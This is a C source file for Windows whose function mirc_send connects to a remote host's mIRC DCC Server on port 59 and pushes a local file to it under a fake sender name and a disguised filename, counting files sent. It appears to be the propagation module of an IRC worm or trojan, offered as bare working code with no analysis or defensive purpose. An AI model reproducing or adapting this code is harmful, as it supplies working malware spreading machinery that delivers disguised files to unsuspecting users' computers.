#include <windows.h>
#include <winsock.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <process.h>
#include "main.h"

extern HWND hwnd;
extern char *ojfile;
extern int debug_on;
extern int filessent;
extern char *ojme;    // my fake name
extern char *ojstain; //name of file
SOCKADDR_IN sin;
LPHOSTENT lpHostEntry;
void mirc_send( char *parms);


void mirc_send( char *parms)  //IP FILE Stain.file
{
	BOOL rerror;
	DWORD btread;
	char ipaddy[150];
	char fname[400];
	char dataf[6000];
	char rfile[200];
	char *u;
	HANDLE fhand;
	SOCKET tmpsock;
	int sock_err;

	ZeroMemory(ipaddy,150);
	ZeroMemory(fname, 400);
	ZeroMemory(rfile,200);
	lstrcat(ipaddy,strtok(parms," \r\n"));
	lstrcat(fname,strtok(0," \r\n"));
	lstrcat(rfile,strtok(0," \r\n"));


	sin.sin_addr.s_addr = inet_addr(ipaddy);
	if (sin.sin_addr.s_addr == INADDR_NONE)
	{
		lpHostEntry = gethostbyname( ipaddy );
		if (lpHostEntry != 0)
		{
			sin.sin_addr.s_addr = *(int long *)lpHostEntry->h_addr_list[0];
		}
		else
	    {
			return;
		}

	}
	tmpsock = socket( PF_INET, SOCK_STREAM, 0);
	if(tmpsock == INVALID_SOCKET)  return;
	sin.sin_port = htons(59);        // Dcc Server
	sin.sin_family = AF_INET;
	sock_err = connect(tmpsock, &sin, sizeof(sin));
	if(sock_err == SOCKET_ERROR) { 	closesocket(tmpsock); return; }

	fhand = CreateFile(fname, GENERIC_READ, FILE_SHARE_READ, 0 ,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL , 0);
	if(fhand == INVALID_HANDLE_VALUE) { closesocket(tmpsock); return; }


	/* 120 <sendername> <FILESIZE> <filename> */
	sprintf(dataf,"120 %s %u %s\r\n",ojme, GetFileSize(fhand,&sock_err), rfile);
	if(send(tmpsock, dataf, lstrlen(dataf),0) == SOCKET_ERROR) { closesocket(tmpsock); CloseHandle(fhand); return; }


	sock_err = recv(tmpsock, dataf, 2000, 0);
	if((sock_err == SOCKET_ERROR) || (sock_err == 0)) { closesocket(tmpsock); CloseHandle(fhand); return; }

	if(u = (char *)strtok(dataf," \r\n"))
	{
		if((atoi((char *)u))== 121)
		{
			u = strtok(0," \r\n");
			if( u = (char*)strtok(0," \r\n"))
			{
				if(atoi(u) == 0)
				{

					sanity:
					rerror = ReadFile(fhand,dataf,2000, &btread,NULL);
					if((rerror) && (btread))
					{
						if(send(tmpsock,dataf,btread,0) == SOCKET_ERROR) { closesocket(tmpsock); CloseHandle(fhand); return; }
						recv(tmpsock,dataf,200,0);
					}
					else
					{
						filessent++;
						CloseHandle(fhand);
						closesocket(tmpsock);
						return;
					}
					goto sanity;

				}
			}
		}
	}
	closesocket(tmpsock); CloseHandle(fhand);

}

